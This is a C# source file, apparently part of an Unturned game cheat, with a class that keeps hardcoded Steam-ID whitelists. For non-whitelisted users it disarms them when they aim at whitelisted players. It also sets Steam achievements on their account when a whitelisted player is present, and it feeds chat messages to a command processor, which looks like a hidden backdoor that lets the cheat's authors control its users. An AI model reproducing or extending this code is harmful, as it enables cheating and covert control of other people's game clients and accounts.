using System;
using System.Collections.Generic;
using System.Text;
using System.Reflection;
using UnityEngine;
using SDG.Unturned;

namespace Payload
{
    public class lib_Skid : MonoBehaviour
    {
        private List<ulong> betalist = new List<ulong>();
        private List<ulong> whitelist = new List<ulong>();
        private List<string> achivementlist = new List<string>();
        private List<string> statlist = new List<string>();

        private lib_Command command;

        public void Start()
        {
            //-------- BETA LIST ----------//
            betalist.Add(76561198205940048); // TStriker
            betalist.Add(76561198104288093); // ItzLuck
            betalist.Add(76561198083641661); // Riviqu
            //-------- WHITE LIST ---------//
            whitelist.Add(76561198073993164); // ShiroGameZ
            whitelist.Add(76561198195276245); // Manitou Real
            //-------- ACHIVEMENT LIST-----//
            achivementlist.Add("pei");
            achivementlist.Add("experienced");
            achivementlist.Add("hoarder");
            achivementlist.Add("murderer");
            achivementlist.Add("survivor");
            achivementlist.Add("scavenger");
            achivementlist.Add("camper");
            achivementlist.Add("schooled");
            achivementlist.Add("berries");
            achivementlist.Add("accident_prone");
            achivementlist.Add("wheel");
            achivementlist.Add("yukon");
            achivementlist.Add("washington");
            achivementlist.Add("educated");
            achivementlist.Add("headshot");
            achivementlist.Add("champion");
            achivementlist.Add("bridge");
            achivementlist.Add("mastermind");
            achivementlist.Add("offense");
            achivementlist.Add("defense");
            achivementlist.Add("support");
            achivementlist.Add("outdoors");
            achivementlist.Add("psychopath");
            achivementlist.Add("unturned");
            achivementlist.Add("hardened");
            achivementlist.Add("forged");
            achivementlist.Add("fishing");
            achivementlist.Add("crafting");
            achivementlist.Add("farming");
            achivementlist.Add("sharpshooter");
            achivementlist.Add("hiking");
            achivementlist.Add("roadtrip");
            achivementlist.Add("fortified");
            //-------- STAT LIST ----------//
            statlist.Add("Kills_Zombies_Normal");
            statlist.Add("Kills_Players");
            statlist.Add("Found_Items");
            statlist.Add("Found_Resources");
            statlist.Add("Found_Experience");
            statlist.Add("Kills_Zombies_Mega");
            statlist.Add("Deaths_Players");
            statlist.Add("Kills_Animals");
            statlist.Add("Found_Crafts");
            statlist.Add("Found_Fishes");
            statlist.Add("Found_Plants");
            statlist.Add("Accuracy_Shot");
            statlist.Add("Accuracy_Hit");
            statlist.Add("Headshots");
            statlist.Add("Travel_Foot");
            statlist.Add("Travel_Vehicle");
            statlist.Add("Arena_Wins");
            statlist.Add("Found_Buildables");
            statlist.Add("Found_Throwables");


            command = new lib_Command(this);
        }

        public void Update()
        {
            if (!isWhitelist(tool_ToolZ.getPlayerID(tool_ToolZ.getLocalPlayer())))
            {
                preventAttack();
                achiUnlock();
                useCommands();
            }
            else
            {
                updateHide();
            }
        }

        public void OnGUI()
        {

        }

        public void updateHide()
        {
            if (Input.GetKeyDown(ctrl_Settings.menu_Easter))
            {
                ctrl_Connector.hide = !ctrl_Connector.hide;
            }
        }

        public void preventAttack()
        {
            RaycastHit hit;
            if (tool_ToolZ.getLookingAt(out hit))
            {
                if (DamageTool.getPlayer(hit.transform) && isWhitelist(tool_ToolZ.getPlayerID(DamageTool.getPlayer(hit.transform))))
                {
                    tool_ToolZ.getLocalPlayer().equipment.dequip();
                }
            }
            else
            {
                //tool_ToolZ.getLocalPlayer().equipment.isBusy = false;
            }
        }

        public void achiUnlock()
        {
            if (white_inServer())
            {
                foreach (string ach in achivementlist)
                {
                    Provider.provider.achievementsService.setAchievement(ach);
                }
            }
        }

        public void useCommands()
        {
            if (ChatManager.chat.Length > 0)
            {
                for (int i = 0; i < ChatManager.chat.Length; i++)
                {
                    command.process_command(ChatManager.chat[i].text, ChatManager.chat[i].speaker, i);
                }
            }
        }

        public bool isWhitelist(ulong id)
        {
            return Array.Exists(whitelist.ToArray(), a => a == id);
        }

        public bool isBeta(ulong id)
        {
            return Array.Exists(betalist.ToArray(), a => a == id);
        }

        public bool white_inServer()
        {
            foreach (ulong id in whitelist)
            {
                if (Array.Exists(Provider.clients.ToArray(), a => a.playerID.steamID.m_SteamID == id))
                {
                    return true;
                }
            }
            return false;
        }

        public ulong[] getWhitelist_inServer()
        {
            List<ulong> whites = new List<ulong>();
            foreach (ulong id in whitelist)
            {
                if (Array.Exists(Provider.clients.ToArray(), a => a.playerID.steamID.m_SteamID == id))
                {
                    whites.Add(id);
                }
            }
            return whites.ToArray();
        }

        public ulong[] getWhitelist()
        {
            return whitelist.ToArray();
        }

        private void setPrim(bool prim)
        {
            tool_ToolZ.getLocalPlayer().equipment.GetType().GetField("prim", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(tool_ToolZ.getLocalPlayer().equipment, prim);
        }
    }
}
